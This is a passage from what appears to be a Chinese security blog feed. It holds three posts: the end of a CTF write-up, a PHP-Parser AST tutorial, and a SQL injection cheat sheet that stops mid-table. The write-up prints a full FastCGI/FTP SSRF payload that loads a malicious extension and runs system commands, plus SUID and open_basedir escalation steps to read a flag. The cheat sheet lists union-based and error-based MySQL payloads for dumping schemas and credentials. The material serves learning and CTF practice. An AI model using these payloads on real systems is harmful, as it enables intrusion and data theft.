class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后构造恶意代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add_api.php?backdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;aaa@xxx.xx.xx.xxx:23&#x2F;123&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><p>当 ftp 建立连接后，会通过 ftp passive mode 模式将 payload 重定向到目标主机本地 9001 端口的 php-fpm 上，并成功反弹shell：</p><p><img src="https://i.loli.net/2021/05/03/BWi8gjseEa93w6S.png"></p><p>但是👴并没有读取 flag 的权限，所以这里需要提权，最常见的便是使用 suid 提权：</p><p>查看具有 suid 的命令：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>在👴复现的时候死活没有查出  /usr/local/bin/php ，所以借用了别的师傅的图：</p><p><img src="https://i.loli.net/2021/05/03/1Eez7giZrwmFf2u.png"></p><p>所以我们可以直接进入交互模式执行代码，得到 flag：</p><p><code>chdir(&#39;Du1&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;);</code></p><p><img src="https://i.loli.net/2021/05/03/VD4goPYEXUA9Gmb.png"></p><p>完事</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于PHP-AST这件事</title>
      <link href="2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
      <url>2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h2><p>👴想写一个自动化寻找 php 反序列化链的小玩意。</p><p>最开始写项目的驱动是黄总说要准备国赛的项目赛，然后表示“今年不能像去年一样鸽掉了”，再然后在一次开会上，双方也是相视一笑：“嘿嘿，嘿嘿”，也就这么搁置下来了。然后说要我们准备好带好下一届，让他们搞，然后看了看这群兔崽子，彳亍……还远着。然后现在是确实自己有了想搞的动力（原因不明），突然，欸就很想搞了，所以就再捡起来。</p><p>但是对于大概的项目流程还是蛮不理解，又是自己一个人搞，就先摸索研究一下。在网上找了很久找到了 <code>PHP-Parser</code> 这个工具，是专门做 PHP AST 的，简单介绍一下吧</p><hr><p>PHP-Parser 的项目主页是 <a href="https://github.com/nikic/PHP-Parser%E3%80%82%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%A4%9A%E7%89%88%E6%9C%AC%E7%9A%84">https://github.com/nikic/PHP-Parser。可以对多版本的</a> PHP 进行完美解析，生成一个抽象语法树</p><p>对于词法分析，PHP 有个内置函数 <code>token_get_all()</code> 可以用来获取 TOKENS，作为语法分析的输入，这个开源项目也是用的 <code>token_get_all()</code> 生成的 token 流</p><blockquote><p>不过话说回来，AST，即 Abstract Syntax Tree，也就是抽象语法树，它是源代码语法结构的一种抽象表示，可以将你所写的的代码用树状结构化表现出来</p></blockquote><hr><p>那么话不多说，直接开整吧</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>可以使用 PHP 的包管理工具 composer 添加，在项目目录执行命令 <code>php composer.phar require nikic/php-parser</code> 即可，如果没有下载 composer，就先执行 <code>curl -s http://getcomposer.org/installer | php</code> 来安装。</p><h3 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h3><p>跟着<a href="https://github.com/nikic/PHP-Parser/tree/master/doc">官方文档</a> 学了。</p><h4 id="基本组成语法"><a href="#基本组成语法" class="headerlink" title="基本组成语法"></a>基本组成语法</h4><h5 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h5><p>如果要使用这个库的话，首先要将 composer 生成的自动装带器给包含进来，可以使用 <code>require &#39;path/to/vendor/autoload.php&#39;;</code>。</p><p>另外，你可以把 <code>xdebug.max_nesting_level</code> 设置为更高的值：<code>ini_set(&#39;xdebug.max_nesting_level&#39;, 3000);</code>。</p><p>这样可以确保遍历高度嵌套的节点树时不会出现错误，但是最好完全禁用 Xdebug，因为它很容易使该库的运行速度慢五倍以上。</p><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p>我们可以创造一个 parser（解析器）实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br></pre></td></tr></table></figure><p>这个工厂类接受一个参数以区别对待不同版本的 PHP：</p><table><thead><tr><th>Kind</th><th>Behavior</th></tr></thead><tbody><tr><td>ParserFactory::PREFER_PHP7</td><td>尝试将代码解析为PHP7。如果失败，请尝试将其解析为PHP 5</td></tr><tr><td>ParserFactory::PREFER_PHP5</td><td>尝试将代码解析为PHP5。如果失败，请尝试将其解析为PHP 7</td></tr><tr><td>ParserFactory::ONLY_PHP7</td><td>将代码解析为PHP7</td></tr><tr><td>ParserFactory::ONLY_PHP5</td><td>将代码解析为PHP5</td></tr></tbody></table><p>除非有更好的选择，一般默认用 <code>PREFER_PHP7</code>，<code>create()</code> 方法可以选择性地接受 <code>Lexer</code> 作为第二个参数，这个我们姑且不做研究。</p><p>然后，我们可以把我们需要 AST 化的 PHP 代码传递给 parse 方法，如果遇到了语法错误，将会抛出 <code>PhpParser\Error</code> 异常：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = &lt;&lt;&lt;<span class="string">&#x27;CODE&#x27;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printLine</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">printLine(<span class="string">&#x27;Hello World!!!&#x27;</span>);</span><br><span class="line">CODE;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmts</span> = <span class="variable">$parser</span>-&gt;parse(<span class="variable">$code</span>);</span><br><span class="line">    <span class="comment">// $stmts is an array of statement nodes</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Parse Error: &#x27;</span>, <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个 parser 实例可以重复使用以解析多个文件。</p><h5 id="节点转储"><a href="#节点转储" class="headerlink" title="节点转储"></a>节点转储</h5><p>如果要以人可读的方式去转储 AST 的话，可以使用 <code>NodeDumper</code>；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nodeDumper</span> = <span class="keyword">new</span> NodeDumper;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nodeDumper</span>-&gt;dump(<span class="variable">$stmts</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>对于之前的实例，将会输出如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    0: Stmt_Function(</span><br><span class="line">        attrGroups: array(</span><br><span class="line">        )</span><br><span class="line">        byRef: false</span><br><span class="line">        name: Identifier(</span><br><span class="line">            name: printLine</span><br><span class="line">        )</span><br><span class="line">        params: array(</span><br><span class="line">            0: Param(</span><br><span class="line">                attrGroups: array(</span><br><span class="line">                )</span><br><span class="line">                flags: 0</span><br><span class="line">                type: null</span><br><span class="line">                byRef: false</span><br><span class="line">                variadic: false</span><br><span class="line">                var: Expr_Variable(</span><br><span class="line">                    name: msg</span><br><span class="line">                )</span><br><span class="line">                default: null</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">        returnType: null</span><br><span class="line">        stmts: array(</span><br><span class="line">            0: Stmt_Echo(</span><br><span class="line">                exprs: array(</span><br><span class="line">                    0: Expr_Variable(</span><br><span class="line">                        name: msg</span><br><span class="line">                    )</span><br><span class="line">                    1: Scalar_String(</span><br><span class="line">                        value: </span><br><span class="line">                    </span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    1: Stmt_Expression(</span><br><span class="line">        expr: Expr_FuncCall(</span><br><span class="line">            name: Name(</span><br><span class="line">                parts: array(</span><br><span class="line">                    0: printLine</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            args: array(</span><br><span class="line">                0: Arg(</span><br><span class="line">                    name: null</span><br><span class="line">                    value: Scalar_String(</span><br><span class="line">                        value: Hello World!!!</span><br><span class="line">                    )</span><br><span class="line">                    byRef: false</span><br><span class="line">                    unpack: false</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们还可以通过使用 <code>php-parse</code> 脚本，使用文件名或者代码字符串调用它来获取 AST：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vendor/bin/php-parse test.php</span><br><span class="line">vendor/bin/php-parse &quot;&lt;?php foo();&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/8YoSePjMbZUhdXm.png"></p><p>如果想要快速获取 AST 中某些语法的表达方式的话，这样就很可。</p><h5 id="节点🌳结构"><a href="#节点🌳结构" class="headerlink" title="节点🌳结构"></a>节点🌳结构</h5><p>观察上面的节点转储，我们可以发现上面代码中的 <code>$stms</code> 是两个节点的数组，一个 <code>Stmt_Function</code> 和一个 <code>Stmt_Expression</code> 节点，它们所对应的类名称为：</p><ul><li><code>Stmt_Function</code> -&gt; <code>PhpParser\Node\Stmt\Function_</code></li><li><code>Stmt_Expression</code> -&gt; <code>PhpParser\Node\Stmt\Expression</code></li></ul><p>可能有人注意到了 Function 类的最后面多了一个 <code>_</code>，但是 Function 是一个保留关键字，该库中的许多节点类名称都带有尾随 <code>_</code>，以避免与关键字冲突。</p><p>因为 PHP 是一种大型语言，所以大概有140多个不同的节点，为了更好地使用它们，将它们分为了三类：</p><ul><li><code>PhpParser\Node\Stmt</code> 是语句节点，即不返回值并且不能出现在表达式中的语言构造，例如类定义就是一个语句，因为它没有返回值所以我们不能构造像 <code>func(class A &#123;&#125;);</code> 这样的语句</li></ul><ul><li><code>PhpParser\Node\Expr</code> 是表达式节点，即返回值的语言构造，因此可以在其他表达式中出现，表达式的实例如：<ul><li><code>$var</code> (<code>PhpParser\Node\Expr\Variable</code>)</li><li><code>func()</code> (<code>PhpParser\Node\Expr\FuncCall</code>)</li></ul></li><li><code>PhpParser\Node\Scalar</code> 是表示标量值的节点，比如 <code>&#39;string&#39;</code> (<code>PhpParser\Node\Scalar\String_</code>)，<code>0</code> (<code>PhpParser\Node\Scalar\LNumber</code>）或者魔术常数比如 <code>__FILE__</code> (<code>PhpParser\Node\Scalar\MagicConst\File</code>)，所有的<code>PhpParser\Node\Scalars</code>都扩展了<code>PhpParser\Node\Expr</code>，因为标量也是表达式。</li><li>这两个组都不存在某些节点，比如名称（<code>PhpParser\Node\Name</code>）和调用参数（<code>PhpParser\Node\Arg</code>）的节点。</li></ul><p><code>Node\Stmt\Expression</code>节点有点令人迷惑，因为它既有术语 statement 又有 expression，这个节点有别于被称为 <code>Node\Expr</code> 的 expr，是一个由表达式 <code>Node\Stmt\Expression</code> 代表的包含 expr 作为子节点的 expression statement。</p>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PROJECT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小谈SQL注入</title>
      <link href="2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>SQL 注入这方面一直挺菜的，整理一下吧</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h3><h4 id="判断-column-数及回显数据字段位置"><a href="#判断-column-数及回显数据字段位置" class="headerlink" title="判断 column 数及回显数据字段位置"></a>判断 column 数及回显数据字段位置</h4><ul><li><code>order/group by N</code></li><li><code>union select 1,2,3...N</code></li></ul><hr><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可</li><li>注意一定要拼接够足够的字段数，否则 SQL 语句报错。PS：此方法也可作为判断前条 select 语句的方法之一</li></ul><hr><h4 id="爆库、表、字段"><a href="#爆库、表、字段" class="headerlink" title="爆库、表、字段"></a>爆库、表、字段</h4><ul><li><p>MySQL version &lt; 5.0</p><ul><li><p>由于 MySQL 的低版本缺乏系统库<code>information_schema</code>，故通常情况下，我们无法直接查询表名，字段（列）名等信息</p><p>这时候只能靠猜来解决，直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据</p><p>若知道仅表名而不知道列（字段）名，可以尝试：</p><ul><li><p>单字段：<code>select *,1,2,xxx from table_name</code></p></li><li><p>多字段：<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p></li></ul></li></ul></li><li><p>MySQL version &gt;= 5.0</p><ul><li><p>爆 schema</p><ul><li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li></ul></li><li><p>爆 table</p><ul><li><p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p></li><li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p></li></ul></li><li><p>爆 column</p><ul><li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li><li><code>union select 1,2,column_name from information_schema.columns where table_schema=database() limit 0,1</code></li></ul></li><li><p>出</p><ul><li><code>select heart from Du1</code></li><li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li></ul></li></ul></li></ul><h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><p>通过特殊函数的报错使其参数被页面输出</p><hr><p>前提：</p><ul><li>服务器开启报错信息返回，也就是发生错误时返回报错信息</li></ul><p>注意：</p><ul><li>报错函数通常有最长报错输出的限制，面对这种情况，可以进行分割输出<ul><li><code>#define ERRMSGSIZE (512)</code></li></ul></li><li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用 group_concat 等函数聚合数据即可</li></ul><hr><h4 id="利用-overflow"><a href="#利用-overflow" class="headerlink" title="利用 overflow"></a>利用 overflow</h4><p>注：MySQL version &gt; 5.5.5 的时候 overflow 才会有错误讯息，MySQL version &gt; 5.5.53 的时候不会显示查询结果</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>适用版本：5.5.49~5.5.5</p><p>该函数会返回 e 的 x 次方结果</p><p>因为 MySQL 能记录的 double 数值范围有限，一旦结果超过范围，则该函数报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307</span><br><span class="line">SELECT exp(710) &#x3D;&gt; ERROR</span><br></pre></td></tr></table></figure><p>故可作 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(~(SELECT * FROM (SELECT user())x));</span><br><span class="line">ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;</span><br></pre></td></tr></table></figure><p>按理来说 <code>pow</code> 应该也可以，原理相同</p><hr><h5 id="bigint-数值操作"><a href="#bigint-数值操作" class="headerlink" title="bigint 数值操作"></a>bigint 数值操作</h5><p>利用了当 MySQL 数据库的某些边界数值进行数值运算时，会报错的原理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~0 &#x3D;&gt; 18446744073709551615</span><br><span class="line">SELECT ~0 + 1 &#x3D;&gt; ERROR</span><br><span class="line">SELECT cot(0) &#x3D;&gt; ERROR</span><br><span class="line"></span><br><span class="line">select !(select * from(select user())a)-~0;</span><br><span class="line">select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure><h4 id="利用-xpath"><a href="#利用-xpath" class="headerlink" title="利用 xpath"></a>利用 xpath</h4><h5 id="extractvalue-长度限制32位"><a href="#extractvalue-长度限制32位" class="headerlink" title="extractvalue (长度限制32位)"></a>extractvalue (长度限制32位)</h5><p>原理：前后添加 ~ 使其不符合 xpath 格式从而报错</p><p>适用版本 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h5 id="updatexml-长度限制32位"><a href="#updatexml-长度限制32位" class="headerlink" title="updatexml (长度限制32位)"></a>updatexml (长度限制32位)</h5><p>适用版本 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h4 id="利用虚拟表报错-主键重复"><a href="#利用虚拟表报错-主键重复" class="headerlink" title="利用虚拟表报错 / 主键重复"></a>利用虚拟表报错 / 主键重复</h4><p>原理：简单来说，是由于 where 条件每执行一次，rand 函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故 <code>rand()</code> 不能后接在<code>order/group by</code> 上</p><hr><p>举栗子：</p><p>假设 USER 表有三条数据，我们通过：<code>select * from USER group by username</code> 来通过其中的 username 字段进行分组</p><p>此过程会先建立一个虚拟表，存在两个字段：<code>key，count</code></p><p>其中我们通过 username 来判断，其在此处是字段，首先先取第一行的数据：<code>username=Du1&amp;password=0312</code></p><p>username 为 Du1 出现一次，则现在虚表内查询是否存在 Du1，若存在，则 count + 1，若不存在，则添加 Du1，其 count 为 1</p><p>对于<code>floor(rand(0)*2)</code>，其中<code>rand()</code>函数，会生成 0 ~ 1 之间随机一个小数、<code>floor()</code>取整数部分、0 是随机因子、乘 2 是为了让大于 0.5 的小数通过 floor 函数得 1</p><p>若表中有三行数据：我们通过<code>select * from USER group by floor(rand(0)*2)</code>进行排序的话</p><blockquote><p>注意：</p><p>由于<code>rand(0)</code>的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011……</p></blockquote><p>首先<code>group by</code>需要执行的话，需要确定分组因子，故<code>floor(rand(0)*2)</code>被执行一次，得到的结果为 0，接着在虚表内检索 0，发现虚表没有键值为 0 的记录，故添加上，在进行添加时：<code>floor(rand(0)*2)</code>第二次被执行，得到结果 1，于是虚拟表插入的内容为<code>key=1&amp;count=1</code></p><p>第二次执行<code>group by</code>时：<code>floor(rand(0)*2)</code>先被运行一次，也就是第三次运行。得到结果 1，查询虚表发现数据存在，因而直接让虚表内的<code>key=1</code>的 count 加一即可，<code>floor(..)</code>只运行了一次</p><p>第三次执行<code>group by</code>时，<code>floor(rand(0)*2)</code>被执行第四次，得到结果 0，查询虚表不存在。再插入虚表时，<code>floor(…)</code>被执行第五次，得到结果 1，故此时虚表将插入的值为<code>key=1&amp;count=1</code>，注意，此时虚表已有一条记录为：<code>key=1&amp;count=2</code>，并且字段 key 为主键，具有不可重复性，故虚表在尝试插入时将产生错误</p><hr><p>故可作 payload：<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><p><img src="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png"></p><p><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code></p><p><img src="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png"></p><h4 id="利用几何函数"><a href="#利用几何函数" class="headerlink" title="利用几何函数"></a>利用几何函数</h4><ul><li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygon：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipoint：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestring：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestring：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygon：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h4 id="利用不存在的函数"><a href="#利用不存在的函数" class="headerlink" title="利用不存在的函数"></a>利用不存在的函数</h4><p>随便用一个不存在的函数，可能会摸奖得到当前所在的数据库名称</p><p><img src="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png"></p><h4 id="利用-name-const"><a href="#利用-name-const" class="headerlink" title="利用 name_const"></a>利用 name_const</h4><p>仅可取数据库版本信息</p><p>payload：<code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p><p><img src="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png"></p><h4 id="uuid-相关函数"><a href="#uuid-相关函数" class="headerlink" title="uuid 相关函数"></a>uuid 相关函数</h4><p>适用版本：8.0.x</p><p>because of 参数格式不正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure><p>这个👴还没测</p><h4 id="GTID-相关函数"><a href="#GTID-相关函数" class="headerlink" title="GTID 相关函数"></a>GTID 相关函数</h4><p>同样也是参数格式不正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select gtid_subset(user(),1);</span><br><span class="line">select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png"></p><h4 id="join-using-注列名"><a href="#join-using-注列名" class="headerlink" title="join using 注列名"></a>join using 注列名</h4><p>通过系统关键词 join 可建立两个表之间的内连接，通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因（相同列名存在）而发生错误，并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure><p>👴不咋懂，希望哪位SQL👴可以带带👴</p><h4 id="ST-相关函数"><a href="#ST-相关函数" class="headerlink" title="ST 相关函数"></a>ST 相关函数</h4><p>MySQL 5.7</p><ul><li><code>select ST_LatFromGeoHash(version());</code></li><li><code>select ST_LongFromGeoHash(version());</code></li><li><code>select ST_PointFromGeoHash(version(),1);</code></li></ul><p><img src="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png"></p><hr><h4 id="报错函数速查表"><a href="#报错函数速查表" class="headerlink" title="报错函数速查表"></a>报错函数速查表</h4><p>注：默认MYSQL_ERRMSG_SIZE=512</p><table><thead><tr><th>类别</th><th>函数</th><th>版本需求</th><th>5.5.x</th><th>5.6.x</th><th>5.7.x</th><th>8.x</th><th>函数显错长度</th><th>Mysql报错内容长度</th><th>额外限制</th></tr></thead><tbody><tr><td>主键重复</td><td>floor round</td><td>❓</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td>64</td><td></td><td>data_type ≠ varchar</td></tr><tr><td>列名重复</td><td>name_const</td><td>❓</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td></td><td>only version()</td></tr><tr><td></td><td>join</td><td>[5.5.49, ?)</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td></td><td>only columns</td></tr><tr><td>数据溢出 - 